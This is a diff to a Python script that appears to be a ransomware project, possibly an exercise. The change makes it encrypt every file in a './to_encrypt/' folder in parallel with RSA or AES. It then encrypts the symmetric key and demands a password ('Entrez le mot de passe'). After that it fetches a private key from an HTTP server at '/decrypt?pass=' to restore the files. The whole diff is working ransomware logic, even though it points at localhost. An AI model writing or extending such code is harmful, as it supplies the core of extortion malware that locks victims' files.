@@ -8,7 +8,9 @@ from cryptography.hazmat.primitives.asymmetric import padding
 import time
 import hashlib
 import os
+import glob
 from Crypto.Cipher import AES
+from multiprocessing import Process
 
 global host
 host = "localhost"
@@ -121,31 +123,43 @@ def decrypt_symetric_key(sym,private_key):
     return original_message.decode("utf-8")
 
 
+def encrypt_one_file(file):
+    global symetric_key
+    if ".encrypted" in str(file):
+        return ""
+    file_enc = file+".encrypted_sym"
 
-file = "test.png"
-file_enc = file+".encrypted_sym"
+    if not os.path.getsize(file)>958:
+        encrypt(file) #Maximum size of the file : 958o
+    else:
+        encrypt_symetric(file,symetric_key)
 
-if not os.path.getsize(file)>958:
-    encrypt(file) #Maximum size of the file : 958o
-else:
-    encrypt_symetric(file,symetric_key)
+def decrypt_one_file(file_enc,mdp,private_key,symetric_key):
+    global host
+    if ".encrypted_sym" in file_enc:
+        decrypt_symetric(file_enc,symetric_key)
+    elif ".encrypted" in file_enc:
+        decrypt(file_enc,private_key)
+
+
+to_encrypt=glob.glob("./to_encrypt/*")
+for i in to_encrypt:
+    worker = Process(target=encrypt_one_file, args=(i,))
+    worker.start()
+    worker.join()
 
 symetric_key = encrypt_symetric_key(symetric_key)
 
 mdp = ""
 while hash_pass(mdp)!=hash_content:
     mdp = input("Entrez le mot de passe :")
-
 with urllib.request.urlopen(f"http://{host}/decrypt?pass={mdp}") as key_file:
     private_key = serialization.load_pem_private_key(
     key_file.read(),
     password=None,
     backend=default_backend()
 )
-
 symetric_key = decrypt_symetric_key(symetric_key,private_key)
-
-if ".encrypted_sym" in file_enc:
-    decrypt_symetric(file_enc,symetric_key)
-elif ".encrypted" in file_enc:
-    decrypt(file_enc,private_key)
+for i in glob.glob("./to_encrypt/*"):
+    if ".encrypted_sym" in i or ".encrypted" in i:
+        decrypt_one_file(i,mdp,private_key,symetric_key)
